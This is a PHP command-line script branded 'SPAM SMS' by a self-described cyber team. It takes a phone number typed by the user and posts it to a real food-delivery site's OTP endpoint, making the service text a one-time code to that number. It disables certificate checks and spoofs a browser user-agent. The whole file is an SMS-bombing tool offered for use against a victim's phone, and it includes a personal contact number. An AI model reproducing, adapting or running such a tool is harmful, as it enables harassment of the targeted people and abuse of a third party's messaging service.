<?php

$banner = "╭━━━┳━━━┳━━━┳━╮╭━╮╭━━━┳━╮╭━┳━━━╮
┃╭━╮┃╭━╮┃╭━╮┃┃╰╯┃┃┃╭━╮┃┃╰╯┃┃╭━╮┃
┃╰━━┫╰━╯┃┃╱┃┃╭╮╭╮┃┃╰━━┫╭╮╭╮┃╰━━╮
╰━━╮┃╭━━┫╰━╯┃┃┃┃┃┃╰━━╮┃┃┃┃┃┣━━╮┃
┃╰━╯┃┃╱╱┃╭━╮┃┃┃┃┃┃┃╰━╯┃┃┃┃┃┃╰━╯┃
╰━━━┻╯╱╱╰╯╱╰┻╯╰╯╰╯╰━━━┻╯╰╯╰┻━━━╯
 AUTHOR   = TN NEOFETCH
 WA       = 081999265308
 TEAM     = T3RROR F4NG CYBER TEAM
 ==================================
 ";

function sms($target){
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.phd.co.id/en/users/sendOTP");
  curl_setopt($ch, CURLOPT_POST,true);
  curl_setopt($ch, CURLOPT_POSTFIELDS, "phone_number=$target");
  curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOTS, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome 60.0.3112.113 Safari/537.36");
  $x = curl_exec($ch);
  curl_close($ch);
   
  if (preg_match('/We have sent an OTP to your phone, Please enter the 4 digit code./', $x)) {
  	echo "BERHASIL";
      }else{
       	echo "GAGAL";
            }
}

system('clear');
echo $banner;
echo "MASUKAN NOMOR : ";
$nomor = trim(fgets(STDIN));
$execute = sms($nomor);
print $execute
?>